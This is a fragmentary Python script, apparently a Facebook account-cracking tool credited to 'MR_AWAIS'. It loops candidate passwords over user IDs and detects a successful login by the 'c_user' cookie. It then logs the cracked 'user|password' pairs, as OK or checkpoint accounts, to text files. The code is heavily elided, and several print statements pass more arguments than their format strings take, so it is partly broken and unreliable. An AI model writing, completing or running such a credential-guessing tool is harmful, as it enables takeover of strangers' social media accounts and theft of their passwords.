...
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           MR_AWAIS

\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m         AWAIS KHAN

\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           AWAISMOMAND78
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mAWAIS_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mAWAIS_OK.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back AS Menu ")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;97m[as] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [AWAIS-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('AS_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    print('\r%s [AWAIS-OK] %s | %s ' % (M, user, pw))

                    wrt = '%s|%s' % (user,pw)

                    cp.append(wrt)

                    open('AWAIS_OK.txt' , 'a').write('%s\n' % wrt)
